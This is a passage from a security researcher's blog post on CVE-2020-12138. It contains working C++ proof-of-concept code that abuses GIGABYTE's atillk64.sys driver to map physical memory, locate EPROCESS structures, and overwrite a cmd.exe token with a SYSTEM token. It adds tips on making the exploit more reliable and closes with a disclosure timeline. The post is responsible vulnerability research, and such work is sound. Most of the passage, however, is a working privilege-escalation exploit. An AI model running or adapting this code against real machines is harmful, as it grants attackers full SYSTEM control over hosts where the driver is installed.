</span><span style="color:#75715e"></span>                            INT64 modulus <span style="color:#f92672">=</span> temp_addr <span style="color:#f92672">%</span> <span style="color:#ae81ff">0x1000</span>;
                            proc_data.page_entry_offset.push_back(modulus);
                            
                            <span style="color:#75715e">// This is the page-aligned address where, either
</span><span style="color:#75715e"></span>                            <span style="color:#75715e">// small or large paged memory will hold our &#34;Proc&#34;
</span><span style="color:#75715e"></span>                            <span style="color:#75715e">// chunk. We store this as our proc_address member
</span><span style="color:#75715e"></span>                            <span style="color:#75715e">// in PROC_DATA.
</span><span style="color:#75715e"></span>                            INT64 page_address <span style="color:#f92672">=</span> temp_addr <span style="color:#f92672">-</span> modulus;
                            proc_data.proc_address.push_back(
                                page_address);
                            proc_data.header_size.push_back(x);
                        }
                    }
                }
            }
            iteration<span style="color:#f92672">++</span>;
        }
        <span style="color:#66d9ef">else</span>
        {
            <span style="color:#75715e">// DeviceIoControl failed
</span><span style="color:#75715e"></span>            iteration<span style="color:#f92672">++</span>;
            failures<span style="color:#f92672">++</span>;
        }
    }
    cout <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;[&gt;] </span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">Proc</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74"> chunks found</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
    cout <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;    - Failed DeviceIoControl calls: &#34;</span> <span style="color:#f92672">&lt;&lt;</span> dec <span style="color:#f92672">&lt;&lt;</span> failures <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
    cout <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;    - Total DeviceIoControl calls: &#34;</span> <span style="color:#f92672">&lt;&lt;</span> dec <span style="color:#f92672">&lt;&lt;</span> iteration <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n\n</span><span style="color:#e6db74">&#34;</span>;

    <span style="color:#75715e">// Returns struct of two vectors, one holds Proc chunk address
</span><span style="color:#75715e"></span>    <span style="color:#75715e">// one holds header-size for that Proc chunk.
</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">return</span> proc_data;
</code></pre></div><p>The next function takes the returned <code>proc_data</code> struct and <strong>re-maps</strong> <code>0x1000</code> bytes of physical memory starting at the physical memory address of the &ldquo;Proc&rdquo; tag (-<code>0x4</code>) but from the beginning of that page. The largest header length I found being <code>0x90</code>, and the largest offset of interest being <code>0x450</code>, we definitely don&rsquo;t need to map this much from this address but I found that mapping anything less would sporadically lead to crashes as it wouldn&rsquo;t be perfectly page-aligned.</p>
<p>The function knows the &ldquo;Proc&rdquo; tag location, the header size, and the offsets for valuable <code>EPROCESS</code> members and goes looking for any likely to be <code>SYSTEM</code> process as defined in a global vector.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cpp" data-lang="cpp">vector<span style="color:#f92672">&lt;</span>INT64<span style="color:#f92672">&gt;</span> SYSTEM_procs <span style="color:#f92672">=</span> {
    <span style="color:#ae81ff">0x78652e7373727363</span>,         <span style="color:#75715e">// csrss.exe
</span><span style="color:#75715e"></span>    <span style="color:#ae81ff">0x78652e737361736c</span>,         <span style="color:#75715e">// lsass.exe
</span><span style="color:#75715e"></span>    <span style="color:#ae81ff">0x6578652e73736d73</span>,         <span style="color:#75715e">// smss.exe
</span><span style="color:#75715e"></span>    <span style="color:#ae81ff">0x7365636976726573</span>,         <span style="color:#75715e">// services.exe
</span><span style="color:#75715e"></span>    <span style="color:#ae81ff">0x6b6f72426d726753</span>,         <span style="color:#75715e">// SgrmBroker.exe
</span><span style="color:#75715e"></span>    <span style="color:#ae81ff">0x2e76736c6f6f7073</span>,         <span style="color:#75715e">// spoolsv.exe
</span><span style="color:#75715e"></span>    <span style="color:#ae81ff">0x6e6f676f6c6e6977</span>,         <span style="color:#75715e">// winlogon.exe
</span><span style="color:#75715e"></span>    <span style="color:#ae81ff">0x2e74696e696e6977</span>,         <span style="color:#75715e">// wininit.exe
</span><span style="color:#75715e"></span>    <span style="color:#ae81ff">0x6578652e736d6c77</span>,         <span style="color:#75715e">// wlms.exe
</span><span style="color:#75715e"></span>};
</code></pre></div><p>If it finds one of these processes and our <code>cmd.exe</code> process it will overwrite the <code>cmd.exe</code> <code>Token</code> with the <code>Token</code> value of a privileged process giving us an <code>nt authority\system</code> shell.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cpp" data-lang="cpp">INT64 SYSTEM_token <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
    INT64 cmd_token_addr <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
    <span style="color:#66d9ef">bool</span> SYSTEM_found <span style="color:#f92672">=</span> false;

    LPVOID output_buff <span style="color:#f92672">=</span> VirtualAlloc(
        NULL,
        <span style="color:#ae81ff">0x8</span>,
        MEM_COMMIT <span style="color:#f92672">|</span> MEM_RESERVE,
        PAGE_EXECUTE_READWRITE);

    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> proc_data.proc_address.size(); i<span style="color:#f92672">++</span>)
    {
        <span style="color:#75715e">// We need to map 0x1000 bytes from our &#34;Proc&#34; tag so that we can parse
</span><span style="color:#75715e"></span>        <span style="color:#75715e">// out all the EPROCESS members we&#39;re interested in. The deepest member
</span><span style="color:#75715e"></span>        <span style="color:#75715e">// is ImageFileName at offset 0x450 from the end of the header. Header
</span><span style="color:#75715e"></span>        <span style="color:#75715e">// sizes varied from 0x20 to 0x90 in my testing. start_address will be
</span><span style="color:#75715e"></span>        <span style="color:#75715e">// the address of the beginning of each 0x1000 aligned address closest
</span><span style="color:#75715e"></span>        <span style="color:#75715e">// to the &#34;Proc&#34; tag we found.
</span><span style="color:#75715e"></span>        DWORDLONG num_of_bytes <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x1000</span>;
        DWORDLONG padding <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x4141414141414141</span>;
        INT64 start_address <span style="color:#f92672">=</span> proc_data.proc_address[i];

        INPUT_BUFFER input_buff <span style="color:#f92672">=</span> { start_address, num_of_bytes, padding };

        DWORD bytes_returned <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;

        <span style="color:#66d9ef">if</span> (DeviceIoControl(
            device_handle,
            IOCTL,
            <span style="color:#f92672">&amp;</span>input_buff,
            <span style="color:#66d9ef">sizeof</span>(input_buff),
            output_buff,
            <span style="color:#66d9ef">sizeof</span>(output_buff),
            <span style="color:#f92672">&amp;</span>bytes_returned,
            NULL))
        {
            <span style="color:#75715e">// Pointer to the beginning of our process space with the mapped
</span><span style="color:#75715e"></span>            <span style="color:#75715e">// 0x1000 bytes of physmem
</span><span style="color:#75715e"></span>            INT64 mapped_address <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(PINT64)output_buff;

            <span style="color:#75715e">// mapped_address is mapping from our page entry where, on that
</span><span style="color:#75715e"></span>            <span style="color:#75715e">// page, exists a &#34;Proc&#34; tag. Therefore, we need both the header
</span><span style="color:#75715e"></span>            <span style="color:#75715e">// size and the offset from the page entry to the &#34;Proc&#34; tag so
</span><span style="color:#75715e"></span>            <span style="color:#75715e">// we can calculate the static offsets/values of the EPROCESS
</span><span style="color:#75715e"></span>            <span style="color:#75715e">// memebers ImageFileName, Token, UniqueProcessId...
</span><span style="color:#75715e"></span>            INT64 imagename_address <span style="color:#f92672">=</span> mapped_address <span style="color:#f92672">+</span>
                proc_data.header_size[i] <span style="color:#f92672">+</span> proc_data.page_entry_offset[i]
                <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x450</span>; <span style="color:#75715e">//ImageFileName
</span><span style="color:#75715e"></span>            INT64 imagename_value <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(PINT64)imagename_address;

            INT64 proc_token_addr <span style="color:#f92672">=</span> mapped_address <span style="color:#f92672">+</span>
                proc_data.header_size[i] <span style="color:#f92672">+</span> proc_data.page_entry_offset[i] 
                <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x360</span>; <span style="color:#75715e">//Token
</span><span style="color:#75715e"></span>            INT64 proc_token <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(PINT64)proc_token_addr;

            INT64 pid_addr <span style="color:#f92672">=</span> mapped_address <span style="color:#f92672">+</span>
                proc_data.header_size[i] <span style="color:#f92672">+</span> proc_data.page_entry_offset[i] 
                <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x2e8</span>; <span style="color:#75715e">//UniqueProcessId
</span><span style="color:#75715e"></span>            INT64 pid_value <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(PINT64)pid_addr;

            <span style="color:#75715e">// See if the ImageFileName 64 bit hex value is in our vector of
</span><span style="color:#75715e"></span>            <span style="color:#75715e">// common SYSTEM processes
</span><span style="color:#75715e"></span>            <span style="color:#66d9ef">int</span> sys_result <span style="color:#f92672">=</span> count(SYSTEM_procs.begin(), SYSTEM_procs.end(),
                imagename_value);
            <span style="color:#66d9ef">if</span> (sys_result <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span> and SYSTEM_found <span style="color:#f92672">==</span> false)
            {
                SYSTEM_token <span style="color:#f92672">=</span> proc_token;
                cout <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;[&gt;] SYSTEM process found!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
                cout <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;    - ImageFileName value: &#34;</span>
                    <span style="color:#f92672">&lt;&lt;</span> (<span style="color:#66d9ef">char</span><span style="color:#f92672">*</span>)imagename_address <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
                cout <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;    - Token value: &#34;</span> <span style="color:#f92672">&lt;&lt;</span> hex <span style="color:#f92672">&lt;&lt;</span> proc_token <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
                cout <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;    - Token address: &#34;</span> <span style="color:#f92672">&lt;&lt;</span> hex <span style="color:#f92672">&lt;&lt;</span> proc_token_addr
                    <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
                cout <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;    - UniqueProcessId: &#34;</span> <span style="color:#f92672">&lt;&lt;</span> dec <span style="color:#f92672">&lt;&lt;</span> pid_value <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n\n</span><span style="color:#e6db74">&#34;</span>;
                SYSTEM_found <span style="color:#f92672">=</span> true;
            }
            <span style="color:#66d9ef">else</span> <span style="color:#a6e22e">if</span> (imagename_value <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x6568737265776f70</span> or
                imagename_value <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x6578652e646d63</span>)  <span style="color:#75715e">// powershell or cmd
</span><span style="color:#75715e"></span>            {
                cmd_token_addr <span style="color:#f92672">=</span> proc_token_addr;
                cout <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;[&gt;] cmd.exe process found!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
                cout <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;    - ImageFileName value: &#34;</span>
                    <span style="color:#f92672">&lt;&lt;</span> (<span style="color:#66d9ef">char</span><span style="color:#f92672">*</span>)imagename_address <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
                cout <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;    - Token value: &#34;</span> <span style="color:#f92672">&lt;&lt;</span> hex <span style="color:#f92672">&lt;&lt;</span> proc_token <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
                cout <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;    - Token address: &#34;</span> <span style="color:#f92672">&lt;&lt;</span> hex <span style="color:#f92672">&lt;&lt;</span> proc_token_addr
                    <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
                cout <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;    - UniqueProcessId: &#34;</span> <span style="color:#f92672">&lt;&lt;</span> dec <span style="color:#f92672">&lt;&lt;</span> pid_value <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n\n</span><span style="color:#e6db74">&#34;</span>;
            }
        }
        <span style="color:#66d9ef">else</span>
        {
            <span style="color:#75715e">//DeviceIoControl failed
</span><span style="color:#75715e"></span>        }
    }
    <span style="color:#66d9ef">if</span> ((<span style="color:#f92672">!</span>cmd_token_addr) or (<span style="color:#f92672">!</span>SYSTEM_token))
    {
        cout <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;[!] Token swapping requirements not met.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
        cout <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;[!] Last physical address scanned: &#34;</span> <span style="color:#f92672">&lt;&lt;</span> hex <span style="color:#f92672">&lt;&lt;</span>
            proc_data.proc_address.back() <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
        cout <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;[!] Better luck next time!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
        exit(<span style="color:#ae81ff">1</span>);
    }
    <span style="color:#66d9ef">else</span>
    {
        <span style="color:#f92672">*</span>(PINT64)cmd_token_addr <span style="color:#f92672">=</span> SYSTEM_token;
        cout <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;[&gt;] SYSTEM and cmd.exe token info found, swapping tokens...</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
        exit(<span style="color:#ae81ff">0</span>);
    }
}
</code></pre></div><p>As you can see, if we don&rsquo;t find both a SYSTEM process and our <code>cmd.exe</code> process, the program exits without doing anything. This wasn&rsquo;t often the case whenever the test machine was left running for at least 2-3 minutes after booting.</p>
<p><strong>Searching for 100 process allocations in the pool is somewhat aggressive.</strong> The program will exit if it doesn&rsquo;t find this many before bumping into the hard cap. Keep in mind that it doesn&rsquo;t start parsing for the <code>EPROCESS</code> data until it has collected 100 &ldquo;Proc&rdquo; tag locations. This could mean that the program exits having already identified the relevant process chunks needed to elevate privileges.</p>
<p>This number can be toned down and the exploit could be trivially tweaked to search very small sections of physical memory at a time before exiting, annotating along the way and printing any valuable <code>EPROCESS</code> structure information to the terminal as it progresses. It could for instance be tweaked to search <code>n</code> amount of physical memory, output the location and token values of any privileged process or the <code>cmd.exe</code> process, and then exit while specifying the last memory address that it mapped. You could then start the exploit up again but this time specify the new last memory address mapped and map <code>n</code> from there and repeat until you had everything you needed.</p>
<p>The hardest part was finding the <code>cmd.exe</code> process. Likely-to-be-SYSTEM processes were easy to find. If you have a remote-desktop/GUI equivalent access to the host machine, you could open a few <code>cmd.exe</code> processes and <strong>greatly</strong> improve your odds of finding one to overwrite and elevate privileges.</p>
<p>Even with just one <code>cmd.exe</code> process, I was able to find and overwrite my token roughly 90% of the time. With more than one, it was 100% in my testing.</p>
<p>There are some improvements that can be made to the exploit no doubt, but as is, it works really well in my testing and can be tweaked fairly easily. I believe it sufficiently proves the vulnerability.</p>
<p>Mandatory screenshot:</p>
<p><img src="/assets/images/AWE/cve6.PNG" alt=""></p>
<h2 id="huge-thanks">Huge Thanks</h2>
<p>Huge thanks to @FuzzySecurity for all of the tutorials, I&rsquo;ve recently also finished up his HEVD exploit tutorials and have learned a ton from his blog. Just an awesome resource.</p>
<p>Thanks to @HackSysTeam for the HackSysExtremeVulnerable driver, it has been such a great learning resource and got me started down this path.</p>
<p>Thanks to both @ihack4falafel and <a href="https://twitter.com/ilove2pwn_">@ilove2pwn_</a> for answering all of my questions along the way or helping me find the answers myself. Very grateful.</p>
<p>Thanks to <a href="https://twitter.com/TheColonial">@TheColonial</a> for his advice about disclosure and his awesome <a href="https://www.youtube.com/watch?v=pJZjWXxUEl4">CAPCOM.SYS</a> YouTube video series. I learned a lot of nice WinDBG tricks from this.</p>
<p>Thanks again to @jessemichael for being so helpful and charitable.</p>
<p>Thanks to <a href="https://twitter.com/Jackson_T">Jackson T.</a> for not only his blog post but for answering all my questions and being extremely helpful, really appreciate it.</p>
<p>And finally thanks to all those cited blog authors <a href="https://twitter.com/rwfpl">@rwfpl</a> and <a href="http://hatriot.github.io/blog/2018/05/17/dell-supportassist-local-privilege-escalation/">@hatRiot</a>.</p>
<p>All testing performed on <code>Build 18362.19h1_release.190318-1202.</code></p>
<p><strong>Please, let me know if you find any errors.</strong></p>
<h2 id="disclosure-timeline">Disclosure Timeline</h2>
<ul>
<li>February 25th 2020 &ndash; Email, Customer Service Ticket, and Twitter DM sent to GIGABYTE USA</li>
<li>February 26th 2020 &ndash; Email to AMD <a href="mailto:psirt@amd.com">psirt@amd.com</a> notification of vulnerability found and PoC created</li>
<li>February 26th 2020 &ndash; Response from psirt to send PoC</li>
<li>February 26th 2020 &ndash; PoC sent to psirt</li>
<li>March 7th 2020 &ndash; Ask for update from psirt, no update given</li>
<li>March 16th 2020 &ndash; Ask for update from psirt</li>
<li>March 16th 2020 &ndash; psirt responds that the issue has been previously reported and that they don&rsquo;t support the product as a result</li>
<li>March 16th 2020 &ndash; I inform psirt that other parties are still packaging and installing the driver and there is no advisory for the driver</li>
<li>March 24th 2020 &ndash; psirt states that support for the driver ended in late 2019 and to contact GIGABYTE directly</li>
<li>April 14th 2020 &ndash; No response from GIGABYTE USA, request CVE</li>
<li>April 24th 2020 &ndash; Assigned CVE-2020-12138, blog posted</li>
</ul>
<h2 id="exploit-code">Exploit Code</h2>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cpp" data-lang="cpp"><span style="color:#75715e">// CVE-2020-12138
</span><span style="color:#75715e">// EOP Exploit POC for atillk64.sys by @h0mbre_
</span><span style="color:#75715e">// C:\Program Files (x86)\GIGABYTE\RGBFusion\AtiTool\atillk64.sys
</span><span style="color:#75715e">// Driver vulnerability referenced in: 
</span><span style="color:#75715e">// https://github.com/eclypsium/Screwed-Drivers
</span><span style="color:#75715e">// https://eclypsium.com/2019/08/10/screwed-drivers-signed-sealed-delivered/
</span><span style="color:#75715e"></span>
<span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;iostream&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;vector&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;algorithm&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;Windows.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&#34;h0mbre.h&#34;</span><span style="color:#75715e">
</span><span style="color:#75715e"></span><span style="color:#66d9ef">using</span> <span style="color:#66d9ef">namespace</span> std;

<span style="color:#75715e">#define DEVICE_NAME         &#34;\\\\.\\atillk64&#34;
</span><span style="color:#75715e">#define IOCTL               0x9C402564
</span><span style="color:#75715e">#define START_ADDRESS       (INT64)0x200000000   </span><span style="color:#75715e">// based off testing my VM
</span><span style="color:#75715e"></span><span style="color:#75715e">#define MAX_ADDRESS         (INT64)0x240000000   </span><span style="color:#75715e">// based off testing my VM
</span><span style="color:#75715e"></span>
<span style="color:#75715e">// Creating vector of hex representation of ImageFileNames of common 
</span><span style="color:#75715e">// SYSTEM processes, eg. &#39;wmlms.exe&#39; = hex(&#39;exe.smlw&#39;)
</span><span style="color:#75715e"></span>vector<span style="color:#f92672">&lt;</span>INT64<span style="color:#f92672">&gt;</span> SYSTEM_procs <span style="color:#f92672">=</span> {
    <span style="color:#ae81ff">0x78652e7373727363</span>,         <span style="color:#75715e">// csrss.exe
</span><span style="color:#75715e"></span>    <span style="color:#ae81ff">0x78652e737361736c</span>,         <span style="color:#75715e">// lsass.exe
</span><span style="color:#75715e"></span>    <span style="color:#ae81ff">0x6578652e73736d73</span>,         <span style="color:#75715e">// smss.exe
</span><span style="color:#75715e"></span>    <span style="color:#ae81ff">0x7365636976726573</span>,         <span style="color:#75715e">// services.exe
</span><span style="color:#75715e"></span>    <span style="color:#ae81ff">0x6b6f72426d726753</span>,         <span style="color:#75715e">// SgrmBroker.exe
</span><span style="color:#75715e"></span>    <span style="color:#ae81ff">0x2e76736c6f6f7073</span>,         <span style="color:#75715e">// spoolsv.exe
</span><span style="color:#75715e"></span>    <span style="color:#ae81ff">0x6e6f676f6c6e6977</span>,         <span style="color:#75715e">// winlogon.exe
</span><span style="color:#75715e"></span>    <span style="color:#ae81ff">0x2e74696e696e6977</span>,         <span style="color:#75715e">// wininit.exe
</span><span style="color:#75715e"></span>    <span style="color:#ae81ff">0x6578652e736d6c77</span>,         <span style="color:#75715e">// wlms.exe
</span><span style="color:#75715e"></span>};

<span style="color:#75715e">// Creating struct for our input buffer to DeviceIoControl
</span><span style="color:#75715e"></span><span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> {
    INT64 start_address;
    DWORDLONG num_of_bytes;
    DWORDLONG padding;
} INPUT_BUFFER;

<span style="color:#75715e">// This struct will hold the address of a &#34;Proc&#34; tag and that Proc chunk&#39;s 
</span><span style="color:#75715e">// header size
</span><span style="color:#75715e"></span><span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">PROC_DATA</span> {
    std<span style="color:#f92672">::</span>vector<span style="color:#f92672">&lt;</span>INT64<span style="color:#f92672">&gt;</span> proc_address;
    std<span style="color:#f92672">::</span>vector<span style="color:#f92672">&lt;</span>INT64<span style="color:#f92672">&gt;</span> page_entry_offset;
    std<span style="color:#f92672">::</span>vector<span style="color:#f92672">&lt;</span>INT64<span style="color:#f92672">&gt;</span> header_size;
};

<span style="color:#75715e">// Grabs handle to atillk64.sys
</span><span style="color:#75715e"></span>HANDLE <span style="color:#a6e22e">get_handle</span>(<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span><span style="color:#f92672">*</span> device_name) {
    HANDLE hFile <span style="color:#f92672">=</span> CreateFileA(
        device_name,
        GENERIC_READ <span style="color:#f92672">|</span> GENERIC_WRITE,
        FILE_SHARE_READ <span style="color:#f92672">|</span> FILE_SHARE_WRITE,
        NULL,
        OPEN_EXISTING,
        <span style="color:#ae81ff">0</span>,
        NULL);

    <span style="color:#66d9ef">if</span> (hFile <span style="color:#f92672">==</span> INVALID_HANDLE_VALUE)
    {
        cout <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;[!] Unable to grab handle to atillk64.sys.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
        exit(<span style="color:#ae81ff">1</span>);
    }
    <span style="color:#66d9ef">else</span>
    {
        string hex_output <span style="color:#f92672">=</span> pretty_hex((<span style="color:#66d9ef">int</span>)hFile);
        cout <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;[&gt;] Successfully grabbed handle to atillk64.sys: &#34;</span>
            <span style="color:#f92672">&lt;&lt;</span> hex_output <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;

        <span style="color:#66d9ef">return</span> hFile;
    }
}

<span style="color:#75715e">// Mapping memory from a physical address to our process virtual space
</span><span style="color:#75715e"></span>PROC_DATA <span style="color:#a6e22e">map_memory</span>(HANDLE device_handle) {

    LPVOID output_buff <span style="color:#f92672">=</span> VirtualAlloc(
        NULL,
        <span style="color:#ae81ff">0x8</span>,
        MEM_COMMIT <span style="color:#f92672">|</span> MEM_RESERVE,
        PAGE_EXECUTE_READWRITE);

    string hex_output <span style="color:#f92672">=</span> pretty_hex((<span style="color:#66d9ef">int</span>)output_buff);
    cout <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;[&gt;] Output buffer allocated at: &#34;</span> <span style="color:#f92672">&lt;&lt;</span> hex_output <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;

    DWORD bytes_returned <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;

    PROC_DATA proc_data;

    <span style="color:#75715e">// failures == unsucessful DeviceIoControl calls
</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">int</span> failures <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;

    <span style="color:#75715e">// How many legitamate &#34;Proc&#34; chunks we&#39;ve found in memory as in
</span><span style="color:#75715e"></span>    <span style="color:#75715e">// we&#39;ve confirmed they have headers.
</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">int</span> proc_count <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
    <span style="color:#66d9ef">int</span> iteration <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
    cout <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;[&gt;] Going fishing for 100 </span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">Proc</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74"> chunks in RAM...</span><span style="color:#ae81ff">\n\n</span><span style="color:#e6db74">&#34;</span>;
    <span style="color:#66d9ef">while</span> (proc_count <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">100</span>)
    {
        DWORDLONG num_of_bytes <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x1000</span>;
        DWORDLONG padding <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x4141414141414141</span>;
        INT64 start_address <span style="color:#f92672">=</span> START_ADDRESS <span style="color:#f92672">+</span> (<span style="color:#ae81ff">0x1000</span> <span style="color:#f92672">*</span> iteration);

        INPUT_BUFFER input_buff <span style="color:#f92672">=</span> { start_address, num_of_bytes, padding };

        <span style="color:#66d9ef">if</span> (input_buff.start_address <span style="color:#f92672">&gt;</span> MAX_ADDRESS)
        {
            cout <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;[!] Max address reached!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
            cout <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;[!] Iterations: &#34;</span> <span style="color:#f92672">&lt;&lt;</span> dec <span style="color:#f92672">&lt;&lt;</span> iteration <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
            exit(<span style="color:#ae81ff">1</span>);
        }
        <span style="color:#66d9ef">if</span> (DeviceIoControl(
            device_handle,
            IOCTL,
            <span style="color:#f92672">&amp;</span>input_buff,
            <span style="color:#66d9ef">sizeof</span>(input_buff),
            output_buff,
            <span style="color:#66d9ef">sizeof</span>(output_buff),
            <span style="color:#f92672">&amp;</span>bytes_returned,
            NULL))
        {
            <span style="color:#75715e">// The virtual address in our process space where RAM was mapped
</span><span style="color:#75715e"></span>            <span style="color:#75715e">// is located in the first 8 bytes of our output_buff.
</span><span style="color:#75715e"></span>            INT64 mapped_address <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(PINT64)output_buff;

            <span style="color:#75715e">// We will read a 32 bit value at offset i + 0x100 at some point
</span><span style="color:#75715e"></span>            <span style="color:#75715e">// when looking for 0x00B80003, so we can&#39;t iterate any further
</span><span style="color:#75715e"></span>            <span style="color:#75715e">// than offset 0xF00 here or we&#39;ll get an access violation.
</span><span style="color:#75715e"></span>            <span style="color:#66d9ef">for</span> (INT64 i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> (<span style="color:#ae81ff">0xF10</span>); i <span style="color:#f92672">=</span> i <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x10</span>)
            {
                INT64 test_address <span style="color:#f92672">=</span> mapped_address <span style="color:#f92672">+</span> i;
                INT32 test_value <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(PINT32)(test_address <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x4</span>);
                <span style="color:#66d9ef">if</span> (test_value <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x636f7250</span>)   <span style="color:#75715e">// &#34;Proc&#34;
</span><span style="color:#75715e"></span>                {
